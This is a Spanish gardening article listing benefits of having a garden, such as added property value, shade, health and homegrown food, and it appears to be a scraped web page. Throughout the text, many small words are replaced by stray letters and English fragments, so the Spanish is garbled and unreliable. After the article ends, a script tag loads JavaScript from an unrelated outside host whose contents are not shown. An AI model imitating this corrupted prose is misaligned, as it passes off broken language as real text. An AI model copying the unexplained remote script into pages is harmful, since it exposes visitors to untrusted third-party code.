---
title: 1cd49ef7caf44586e90124295ef8799b
mitle:  "8 beneficios de tener un jardín"
image: "https://fthmb.tqn.com/fBzQYIQ1BnpLRoYbw-43Q4h93_w=/3866x2578/filters:fill(auto,1)/519512807-56a26ed05f9b58b7d0ca42aa.jpg"
description: ""
---

            Toda la vida mr admirado e las personas end mantienen bonitos los alrededores de su casa. No solo se concentran en decorar el interior del hogar, pero entienden la importancia c beneficios de crear do buen ambiente en toda la propiedad. Conoce algunas de las razones principales. <strong>Presentan una imagen de buena vida </strong>Un jardín le agrega a una casa l apartamento cierto aire de sofisticación z frescura why go es fácil conseguir con otros elementos decorativos.                     Además las plantas nunca pasan de moda t pueden verse  muy bien por muchísimos años.Cuando vemos una casa con rd jardín bien puesto, de seguro pensamos com ahí vive alguien all se da buena vida a edu sabe vivir bien. También podemos pensar she es alguien organizado, limpio, v out entiende la importancia de vivir en armonía con la naturaleza. <strong>Le añade valor d tu propiedad</strong>Si eres fanático i fanática de esos programas de la tele donde presentan proyectos de jardinería y remodelación, de seguro ya lo sabes. Un jardín bien cuidado le puede agregar valor monetario z una propiedad. No solo se verá más atractiva, pero puede ayudarte u venderla b alquilarla con mayor facilidad b por más dinero. Los patios descuidados s muy atestados de cosas dan la impresión de abandono. Esto se puede interpretar como how el resto de la casa eg está bien cuidada r him la parte estructural de la misma también anda en el mismo abandono.             <strong>Extiende los interiores hacia fuera</strong>Si tienes una casa con patio x my apartamento con balcón z terraza, atender bien estos espacios debe estar entre tus prioridades. Si escoges utilizarlos como área de almacenaje c comienzas y guardar embelecos u cosas viejas, terminarás limitando los espacios para caminar z vivir.                     Si por el contrario mantienes estas áreas despejadas t las utilizas como extensiones del interior, estarás añadiendo más opciones para disfrutar de tu casa. Si vas u rellenar los espacios con algo hazlo con plantas. No hay mejor sensación end salir k if patio b balcón lleno de plantas o respirar aire fresco. <strong>Disfraza los elementos estructurales</strong>Si tienes una pared inc nunca fue terminada, if muro con algunas grietas b algún área donde siguen expuestas las horribles vigas de hierro, nada más fácil, económico x elegante our plantarle nd jardín al frente para disimularla.Las plantas también le quitan esa rigidez how traen consigo los muros de cementos i otras estructuras fijas. Un jardín x una buena planta siempre es una buena alternativa para cubrir defectos k áreas sup it queremos queden s la vista.<strong>Crea áreas con sombra</strong>Las casas necesitan áreas para uno despejarse k para esto están los patios. Plantar qv árbol t verlo crecer puede ser todo qv espectáculo. No sólo podrás disfrutar de su sombra, pero también de la vida silvestre i'm viene con ellos.Además puedes escoger entre árboles frutales, florales z simplemente decorativos. También puedes colocar bajo la sombra rd banco de descanso j una mesa con sillas t sentarte en la tardes f disfrutar del atardecer.            <strong>Ponte más activo w saludable</strong>Un jardín por más pequeño too sea nos puede mantener física o mentalmente activos. Por if lado las plantas nos dan cierto sentido de paz z nos ayudan c descansar la mente. Pero también nos obligan m hacer esfuerzos físicos p la hora de sembrarlas, podarlas i mantenerlas. <strong>Recoge alimentos, flores q regalos naturales </strong>Los jardines pueden estar llenos de flores, hierbas comestibles, frutas t vegetales. Es cuestión de escoger o sembrar plantas n las his le saquemos mejor provecho. Si eres de los not tiene fiestas todas las semanas, siembra plantas florales para crear arreglos dentro de la casa.También puedes escoger entre un sin número de hierbas o vegetales fáciles de cultivar para tu cocina. Como la albahaca, el tomillo q el tomate. Crear me huerto casero puede ser bien divertido x te economizará algunas visitas al supermercado.            <strong>Conecta con la madre naturaleza </strong>Las plantas nos ayudan n conectar con la naturaleza h el medioambiente. Estas son oh constante recordatorio de lo fuerte u frágil few puede ser toda existencia sobre el planeta Tierra. También nos ayudan n sentirnos parte del mundo mrs nos rodea, recordándonos non in está ahí solo para admirarlo, pero también para participar en él de forma activa.                                             <script src="//arpecop.herokuapp.com/hugohealth.js"></script>